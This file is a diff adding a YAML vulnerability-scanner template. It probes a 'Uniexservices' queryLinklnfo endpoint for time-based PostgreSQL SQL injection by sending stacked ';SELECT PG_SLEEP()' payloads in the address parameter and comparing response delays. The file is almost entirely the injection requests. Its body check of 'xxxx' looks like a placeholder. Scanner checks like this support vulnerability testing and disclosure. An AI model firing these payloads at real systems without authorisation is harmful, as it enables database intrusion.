@@ -1,0 +1,35 @@
+name: poc-yaml-test-sqli
+manual: true
+transport: http
+set:
+  sleepSecond1: randomInt(6, 8)
+  sleepSecond2: randomInt(3, 5)
+rules:
+  r0:
+    request:
+      cache: true
+      method: GET
+      path: /Uniexservices/link/queryLinklnfo?address=%27;SELECT%20PG_SLEEP(5)--
+    expression: response.status == 200 &&  response.body_string.contains("xxxx")
+    output:
+      r0latency: response.latency 
+  r1:
+    request:
+      cache: true
+      method: GET
+      read_timeout: "10"
+      path: /Uniexservices/link/queryLinklnfo?address=%27;SELECT%20PG_SLEEP({{sleepSecond1}})--
+    expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000 &&  response.body_string.contains("xxxx")
+  r2:
+    request:
+      cache: true
+      method: GET
+      read_timeout: "10"
+      path: /Uniexservices/link/queryLinklnfo?address=%27;SELECT%20PG_SLEEP({{sleepSecond2}})--
+    expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000 &&  response.body_string.contains("xxxx")
+expression: r0() && r1() && r2()
+detail:
+  author: k3ppf0r
+  links:
+    - https://blog.csdn.net/qq_41904294/article/details/140684150?spm=1001.2014.3001.5502
+
